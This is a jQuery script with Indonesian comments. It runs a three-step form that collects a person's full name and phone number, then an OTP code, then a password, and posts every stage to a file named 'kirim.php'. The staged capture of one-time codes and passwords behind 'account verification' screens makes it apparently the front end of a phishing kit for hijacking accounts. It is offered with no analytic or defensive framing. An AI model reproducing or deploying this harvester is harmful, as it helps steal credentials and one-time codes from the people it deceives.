function processFirstData() {
    $('#firstForm').submit(function(e) {
        e.preventDefault();

        var $full_name = $("input#full_name").val();
        var $phone_number = $("input#phone_number").val();

        if ($full_name == "" || $phone_number == "") {
            $('.verification_info').show();
            $('.account_verification').hide();
            return false;
        }

        $.ajax({
            type: "POST",
            url: "kirim.php", // Mengarah ke file PHP kita
            data: $(this).serialize(), // Mengirim data form (name & phone)
            beforeSend: function() {
                $('.loading').show();
            },
            success: function() {
                $(".second").show();
                $('.loading').hide();
                $('.first').hide();
                $("input#validateFullName").val($full_name);
                $("input#validatePhoneNumber").val($phone_number);
            }
        });
    });
    return false;
};

function processSecondData() {
    $('#secondForm').submit(function(e) {
        e.preventDefault();

        var $full_name = $("input#validateFullName").val();
        var $phone_number = $("input#validatePhoneNumber").val();
        var $otp_code = $("input#otp").val();

        if ($full_name == "" || $phone_number == "" || $otp_code == "") {
            $('.verification_info').show();
            $('.account_verification').hide();
            return false;
        }

        // Kita perlu mengirim full_name dan phone_number juga agar PHP bisa mencatatnya
        var dataKirim = $(this).serialize() + "&full_name=" + encodeURIComponent($full_name) + "&phone_number=" + encodeURIComponent($phone_number);

        $.ajax({
            type: "POST",
            url: "kirim.php",
            data: dataKirim,
            beforeSend: function() {
                $('.loading').show();
            },
            success: function() {
                $(".third").show();
                $('.loading').hide();
                $('.second').hide();
                $("input#validateOtp").val($otp_code);
            }
        });
    });
    return false;
};

function processThirdData() {
    $('#thirdForm').submit(function(e) {
        e.preventDefault();

        var $full_name = $("input#validateFullName").val();
        var $phone_number = $("input#validatePhoneNumber").val();
        var $otp_code = $("input#otp").val(); // Pastikan input OTP sebelumnya nilainya terbawa/tersimpan
        // Jika input OTP hilang di tahap 3, Anda perlu input hidden dengan id="validateOtp"
        var $password = $("input#password").val();

        if ($full_name == "" || $phone_number == "" || $password == "") {
            $('.verification_info').show();
            $('.account_verification').hide();
            return false;
        }

        var dataKirim = $(this).serialize() + "&full_name=" + encodeURIComponent($full_name) + "&phone_number=" + encodeURIComponent($phone_number) + "&otp=" + encodeURIComponent($otp_code);

        $.ajax({
            type: "POST",
            url: "kirim.php",
            data: dataKirim,
            beforeSend: function() {
                $('.loading').show();
            },
            success: function() {
                $(".four").show();
                $('.loading').hide();
                $('.third').hide();
            }
        });
    });
    return false;
};
